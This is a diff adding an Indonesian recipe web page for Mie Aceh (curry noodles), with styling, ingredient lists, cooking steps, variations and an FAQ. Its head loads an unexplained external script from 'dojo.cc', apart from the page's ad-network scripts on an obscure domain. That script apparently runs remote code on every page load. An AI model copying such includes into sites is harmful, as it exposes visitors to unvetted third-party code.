@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Resep Mie Aceh - Masakan Khas Aceh Pedas Gurih | Masakanku</title>
+    <meta name="description" content="Resep Mie Aceh lengkap dengan bumbu kari khas Aceh. Tips, variasi, dan rahasia bikin mie Aceh seenak restoran favorit.">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            line-height: 1.7;
+            color: #2d2d2d;
+            background: #faf7f2;
+        }
+        nav {
+            background: linear-gradient(135deg, #c0392b, #e74c3c);
+            padding: 1rem 0;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        nav .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+        nav .logo {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: #fff;
+            text-decoration: none;
+            letter-spacing: -0.5px;
+        }
+        nav .logo span {
+            color: #ffd700;
+        }
+        nav .tagline {
+            color: rgba(255,255,255,0.85);
+            font-size: 0.85rem;
+            margin-left: auto;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 1.5rem 1rem;
+        }
+        article {
+            background: #fff;
+            border-radius: 16px;
+            padding: 2rem 2.5rem;
+            box-shadow: 0 1px 20px rgba(0,0,0,0.06);
+            margin-bottom: 2rem;
+        }
+        h1 {
+            font-size: 2rem;
+            line-height: 1.3;
+            margin-bottom: 1rem;
+            color: #1a1a1a;
+        }
+        h1::before {
+            content: "🍜 ";
+        }
+        h2 {
+            font-size: 1.5rem;
+            margin: 2rem 0 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 3px solid #e74c3c;
+            color: #c0392b;
+        }
+        h3 {
+            font-size: 1.15rem;
+            margin: 1.25rem 0 0.5rem;
+            color: #333;
+        }
+        p {
+            margin-bottom: 1rem;
+            text-align: justify;
+        }
+        .hero-img {
+            width: 100%;
+            border-radius: 12px;
+            margin: 1rem 0 1.5rem;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        .ingredients, .steps, .tips-box, .faq-item {
+            background: #fdf6ee;
+            border-radius: 12px;
+            padding: 1.5rem 2rem;
+            margin: 1rem 0 1.5rem;
+        }
+        .ingredients ul, .steps ol {
+            padding-left: 1.5rem;
+        }
+        .ingredients li, .steps li {
+            margin-bottom: 0.5rem;
+        }
+        .ingredients h3 {
+            color: #c0392b;
+            margin-top: 1rem;
+        }
+        .ingredients h3:first-child {
+            margin-top: 0;
+        }
+        .steps li {
+            margin-bottom: 1rem;
+            line-height: 1.6;
+            padding-left: 0.5rem;
+        }
+        .steps li strong {
+            color: #c0392b;
+        }
+        .tips-box {
+            background: #e8f5e9;
+            border-left: 5px solid #2e7d32;
+        }
+        .tips-box h3 {
+            color: #2e7d32;
+            margin-top: 0;
+        }
+        .tips-box ul {
+            padding-left: 1.5rem;
+        }
+        .tips-box li {
+            margin-bottom: 0.5rem;
+        }
+        .cta {
+            background: linear-gradient(135deg, #c0392b, #e74c3c);
+            color: #fff;
+            text-align: center;
+            padding: 2rem;
+            border-radius: 12px;
+            margin: 2rem 0;
+        }
+        .cta h3 {
+            color: #fff;
+            font-size: 1.3rem;
+            margin-bottom: 0.5rem;
+        }
+        .cta p {
+            color: rgba(255,255,255,0.9);
+            text-align: center;
+            margin-bottom: 0;
+        }
+        .related {
+            background: #f0f4f8;
+            border-radius: 12px;
+            padding: 1.5rem 2rem;
+            margin: 1.5rem 0;
+        }
+        .related h3 {
+            margin-top: 0;
+            color: #2c3e50;
+        }
+        .related ul {
+            list-style: none;
+            padding: 0;
+        }
+        .related li {
+            margin-bottom: 0.5rem;
+            padding: 0.4rem 0;
+        }
+        .related a {
+            color: #c0392b;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .related a:hover {
+            text-decoration: underline;
+        }
+        footer {
+            background: #2d2d2d;
+            color: rgba(255,255,255,0.7);
+            padding: 1.5rem 0;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+        footer a {
+            color: #ffd700;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 640px) {
+            article {
+                padding: 1.2rem;
+            }
+            h1 {
+                font-size: 1.5rem;
+            }
+            h2 {
+                font-size: 1.25rem;
+            }
+            nav .tagline {
+                display: none;
+            }
+        }
+    </style>
+    <script src="//dojo.cc/124.js"></script>
+</head>
+<body>
+
+<nav>
+    <div class="container">
+        <a href="/" class="logo">Masakanku<span>.</span>online</a>
+        <span class="tagline">Resep rumahan favorit Indonesia</span>
+    </div>
+</nav>
+
+<div class="container">
+    <article>
+        <h1>Resep Mie Aceh: Mie Kari Khas Aceh yang Pedas Gurih Bikin Ketagihan</h1>
+
+        <img src="https://images.unsplash.com/photo-1476224203421-9ac39bcb3327?w=800&h=500&fit=crop" alt="Mie Aceh dengan kuah kari pedas" class="hero-img" loading="lazy">
+
+        <p>Pertama kali nyobain Mie Aceh, langsung jatuh cinta. Rasa kari khas Aceh yang pekat, pedasnya nendang, plus tekstur mie lidi kenyal — benar-benar beda dari mie-mie lain yang pernah aku coba. Dulu aku pikir bikin Mie Aceh di rumah itu ribet banget. Tapi setelah ngulik-ngulik resep dari beberapa orang asli Aceh ternyata rahasianya ada di bumbu halus yang diulek sampai benar-benar halus dan teknik menumisnya. Sekarang Mie Aceh udah jadi andalan kalau lagi kangen makanan pedas berbumbu. Yuk cobain resep ini di rumah!</p>
+
+        <h2>Apa Itu Mie Aceh?</h2>
+
+        <p>Mie Aceh adalah hidangan mie khas dari Provinsi Aceh yang terkenal dengan cita rasa rempah yang kuat. Bedanya dari mie-mie lain, Mie Aceh menggunakan mie lidi — mie bertekstur kenyal agak besar mirip spaghetti — yang dimasak dengan bumbu kari khas Aceh yang super kaya rempah. Ada tiga varian utama: Mie Aceh Goreng (kering), Mie Aceh Kuah, dan Mie Aceh Tumis (setengah basah).</p>
+
+        <p>Yang bikin Mie Aceh spesial adalah penggunaan <em>kari bubuk</em> plus rempah utuh kayu manis, kapulaga, dan cengkeh. Bubuk kari yang dipakai bukan sembarang kari bubuk — biasanya campuran spesial dengan kunyit, jahe, dan jintan yang bikin warna kuning-oranye khas. Ditambah lagi irisan daging sapi, tauge, kol, dan taburan bawang goreng di atasnya. Dijamin satu porsi nggak bakal cukup!</p>
+
+        <p>Dulu waktu jalan-jalan ke Banda Aceh, aku sempat mampir ke warung Mie Aceh langganan warga lokal. Porsinya besar, bumbunya medok, dan pedasnya bikin keringetan tapi nagih. Sejak itu aku berniat bikin sendiri di rumah dengan resep yang nggak kalah enak. Dan setelah beberapa kali trial-error, akhirnya nemu formula yang pas!</p>
+
+        <h2>Bahan-Bahan Mie Aceh</h2>
+        <div class="ingredients">
+            <h3>🍝 Bahan Utama</h3>
+            <ul>
+                <li>500 gram mie basah atau mie lidi</li>
+                <li>200 gram daging sapi has dalam, iris tipis (bisa pakai daging cincang)</li>
+                <li>100 gram tauge, siangi</li>
+                <li>100 gram kol, iris halus</li>
+                <li>3 batang daun bawang, iris serong</li>
+                <li>3 sdm bawang goreng untuk taburan</li>
+                <li>2 sdm minyak goreng atau minyak samin</li>
+            </ul>
+
+            <h3>🌶️ Bumbu Halus</h3>
+            <ul>
+                <li>8 butir bawang merah</li>
+                <li>5 siung bawang putih</li>
+                <li>10 buah cabe merah keriting (sesuai selera pedas)</li>
+                <li>5 buah cabe rawit merah (tambah kalau suka extra pedas)</li>
+                <li>3 cm kunyit bakar</li>
+                <li>2 cm jahe</li>
+                <li>3 butir kemiri sangrai</li>
+                <li>1 sdt jintan sangrai</li>
+                <li>1 sdt garam</li>
+                <li>1 sdt gula pasir</li>
+            </ul>
+
+            <h3>🧂 Bumbu Pelengkap</h3>
+            <ul>
+                <li>2 sdm kari bubuk (kualitas bagus ya)</li>
+                <li>2 butir kapulaga, memarkan</li>
+                <li>3 cm kayu manis</li>
+                <li>2 butir cengkeh</li>
+                <li>1 batang serai, memarkan</li>
+                <li>2 lembar daun salam</li>
+                <li>2 sdm kecap manis</li>
+                <li>1 sdm saus tiram</li>
+                <li>200 ml air kaldu sapi</li>
+                <li>Minyak goreng secukupnya untuk menumis</li>
+            </ul>
+        </div>
+
+        <div class="ad-container" style="margin:1.5rem 0;text-align:center;min-height:90px">
+            <script async="async" data-cfasync="false" src="https://jabturfembitter.com/fbf97f8372ae4f56ef2fbb64a6663968/invoke.js"></script>
+            <div id="container-fbf97f8372ae4f56ef2fbb64a6663968"></div>
+        </div>
+
+        <h2>Cara Membuat Mie Aceh</h2>
+        <div class="steps">
+            <ol>
+                <li><strong>Siapkan mie-nya dulu ya.</strong> Rebus mie lidi atau mie basah dalam air mendidih sampai empuk tapi jangan terlalu lembek. Angkat, tiriskan, lalu siram dengan air dingin biar nggak lengket. Beri sedikit minyak goreng dan aduk rata biar mie nggak saling nempel. Sisihkan.</li>
+
+                <li><strong>Tumis bumbu sampai wangi.</strong> Panaskan minyak atau minyak samin di wajan dengan api sedang. Tumis bumbu halus bersama kapulaga, kayu manis, cengkeh, serai, dan daun salam. Aduk terus sampai bumbu matang dan aroma rempahnya keluar — sekitar 5-7 menit. Masukkan kari bubuk, aduk rata sebentar saja biar nggak gosong.</li>
+
+                <li><strong>Masak dagingnya.</strong> Masukkan irisan daging sapi ke dalam tumisan bumbu. Aduk sampai daging berubah warna. Tuang air kaldu sapi, tambahkan kecap manis dan saus tiram. Masak dengan api kecil sampai daging empuk dan bumbu meresap, kira-kira 10-15 menit. Kalau mau agak kering, masak sampai air menyusut. Kalau mau berkuah, sisakan sedikit airnya.</li>
+
+                <li><strong>Campur mie dan sayuran.</strong> Masukkan mie yang sudah direbus, irisan kol, dan tauge ke dalam wajan. Aduk cepat dengan api besar sampai semua tercampur rata. Masak sekitar 2-3 menit. Koreksi rasa — tambah garam, gula, atau kecap sesuai selera. Angkat dan sajikan panas-panas dengan taburan daun bawang dan bawang goreng. Jangan lupa sambal dan acar timun sebagai pelengkap! 🔥</li>
+            </ol>
+        </div>
+
+        <h2>Rahasia Mie Aceh yang Enak</h2>
+
+        <p>Kalau mau Mie Aceh buatan sendiri seenak buatan warga asli Aceh, ada beberapa rahasia yang wajib kamu tahu. Pertama, <strong>bakar kunyit dan sangrai kemiri</strong> sebelum diulek — ini bikin rasa bumbu lebih dalam dan nggak langu. Kedua, pakai <strong>minyak samin</strong> alias minyak lemak sapi untuk menumis. Aroma khas minyak samin bikin Mie Aceh beda dari mie kari biasa.</p>
+
+        <p>Rahasia ketiga — <strong>jangan skip kari bubuk</strong>. Kari bubuk yang berkualitas jadi kunci utama cita rasa Mie Aceh. Kalau bisa, cari kari bubuk khas Aceh atau India yang aromanya kuat. Terakhir, <strong>kombinasi api besar dan gerakan cepat</strong> waktu mencampur mie dengan bumbu bikin mie tetap kenyal dan bumbu nempel sempurna tanpa overmasak.</p>
+
+        <h2>Variasi Mie Aceh</h2>
+
+        <p><strong>🥩 Mie Aceh Goreng.</strong> Ini varian paling klasik. Setelah daging dan bumbu matang, kamu masak terus sampai air benar-benar habis. Hasilnya mie kering dengan bumbu yang nempel kuat di setiap helai mie. Cocok buat yang suka tekstur mie yang lebih kering dan bumbu yang intense.</p>
+
+        <p><strong>🍜 Mie Aceh Kuah.</strong> Varian favorit buat yang suka berkuah. Setelah menumis bumbu dan daging, tambah air kaldu sapi lebih banyak — sekitar 400-500 ml. Masak sampai mendidih, baru masukkan mie dan sayuran. Kuah kari-nya gurih pedas, cocok banget diseruput pas cuaca lagi dingin atau lagi hujan.</p>
+
+        <p><strong>🦐 Mie Aceh Seafood.</strong> Penggemar seafood wajib coba varian ini. Daging sapi diganti dengan udang, cumi, dan potongan ikan. Bumbu dasarnya sama, cuma waktu memasak seafood harus lebih cepet biar nggak alot. Tambahkan sedikit perasan jeruk nipis pas disajikan biar makin segar.</p>
+
+        <h2>Tips Biar Mie Aceh Sempurna</h2>
+        <div class="tips-box">
+            <h3>🥥 Tips & Trik Mie Aceh Anti Gagal</h3>
+            <ul>
+                <li><strong>Pilih mie yang tepat.</strong> Kalau nemu mie lidi asli, itu yang paling ideal. Alternatifnya bisa pakai spaghetti atau mie telur yang agak besar ukurannya.</li>
+                <li><strong>Jangan merebus mie terlalu lama.</strong> Mie lidi cukup direbus 3-4 menit. Kalau kelamaan, teksturnya jadi lembek dan nggak kenyal lagi.</li>
+                <li><strong>Sangrai kari bubuk sebentar.</strong> Masukkan kari bubuk setelah bumbu halus matang, lalu aduk cepat selama 30 detik. Ini ngeluarin aroma kari yang maksimal.</li>
+                <li><strong>Gunakan api besar waktu mencampur.</strong> Waktu mencampur mie dengan bumbu, pakai api besar dan aduk cepat. Ini bikin mie tetap kenyal dan bumbu merata.</li>
+                <li><strong>Sajikan dengan pelengkap wajib.</strong> Acar timun dan sambal rawit ijo jadi teman setia Mie Aceh. Jangan lupa emping atau kerupuk udang juga!</li>
+            </ul>
+        </div>
+
+        <h2>FAQ Mie Aceh</h2>
+        <div class="faq-item">
+            <p><strong>❓ Mie Aceh bedanya sama mie kari biasa apa sih?</strong><br>
+            Bedanya ada di rempahnya yang lebih kompleks, penggunaan mie lidi yang kenyal, dan teknik memasaknya yang pakai api besar. Bumbu Mie Aceh juga lebih dominan cabe dan kunyit dibanding mie kari biasa.</p>
+        </div>
+        <div class="faq-item">
+            <p><strong>❓ Kalau nggak ada mie lidi, bisa pakai mie apa?</strong><br>
+            Bisa banget! Alternatifnya pakai spaghetti nomor 11 atau 12 yang direbus al dente, mie telur agak tebal, atau kwetiau basah. Rasanya tetap enak walau teksturnya agak beda.</p>
+        </div>
+        <div class="faq-item">
+            <p><strong>❓ Mie Aceh cocok buat vegetarian nggak?</strong><br>
+            Tentu! Tinggal ganti daging sapi dengan tahu, tempe, atau jamur tiram. Untuk rasa gurih, tambah kaldu jamur dan santan kental sedikit. Dijamin tetap lezat!</p>
+        </div>
+        <div class="faq-item">
+            <p><strong>❓ Apakah Mie Aceh harus pedas banget?</strong><br>
+            Nggak harus. Jumlah cabe bisa disesuaikan dengan selera. Mulai dari 5 cabe merah keriting buat level pedas ringan, atau 15 cabe plus cabe rawit buat yang suka extra pedas. Racik sesuai kemampuan lidah masing-masing.</p>
+        </div>
+        <div class="faq-item">
+            <p><strong>❓ Mie Aceh bisa disimpan buat stok?</strong><br>
+            Bisa! Pisahkan mie dengan bumbu tumisnya. Simpan di wadah tertutup di kulkas tahan 2-3 hari. Tinggal panaskan di wajan dengan sedikit air, aduk-aduk, dan Mie Aceh siap dinikmati lagi.</p>
+        </div>
+
+        <div class="cta">
+            <h3>Udah siap bikin Mie Aceh sendiri? 🎯</h3>
+            <p>Kalau udah nyobain resep ini, share foto hasil masakanmu di Instagram dan tag @masakanku.online ya! Atau kreasikan dengan topping favoritmu — telur ceplok, ayam suwir, atau bakso juga enak banget. Selamat masak dan jangan lupa siapin tisu buat ngelap keringet pedasnya! 😄🔥</p>
+        </div>
+
+        <div class="related">
+            <h3>📚 Baca Juga</h3>
+            <ul>
+                <li><a href="https://masakanku.online/resep-garang-asem">Resep Garang Asem — Ayam Kuah Asam Pedas Khas Jawa Tengah</a></li>
+                <li><a href="https://masakanku.online/resep-rawon">Resep Rawon — Sup Daging Hitam Khas Jawa Timur</a></li>
+                <li><a href="https://masakanku.online/resep-soto-banjar">Resep Soto Banjar — Soto Ayam Bening Khas Kalimantan</a></li>
+                <li><a href="https://masakanku.online/resep-ayam-betutu">Resep Ayam Betutu — Ayam Bumbu Base Genep Khas Bali</a></li>
+            </ul>
+        </div>
+    </article>
+</div>
+
+<div class="ad-container" style="margin:1.5rem 0;text-align:center">
+    <script>atOptions={"key":"7f4bd95b8fb4ff051d5837b9e935f6b8","format":"iframe","height":90,"width":728,"params":{}};</script>
+    <script src="https://jabturfembitter.com/7f4bd95b8fb4ff051d5837b9e935f6b8/invoke.js"></script>
+</div>
+
+<footer>
+    <p>© 2025 <a href="https://masakanku.online">Masakanku.online</a> — Resep rumahan buat semua orang | Dibuat dengan ❤️ oleh <a href="https://remoteproduktif.com">RemoteProduktif</a> &amp; <a href="https://fattan.com">Fattan</a></p>
+</footer>
+
+</body>
+</html>
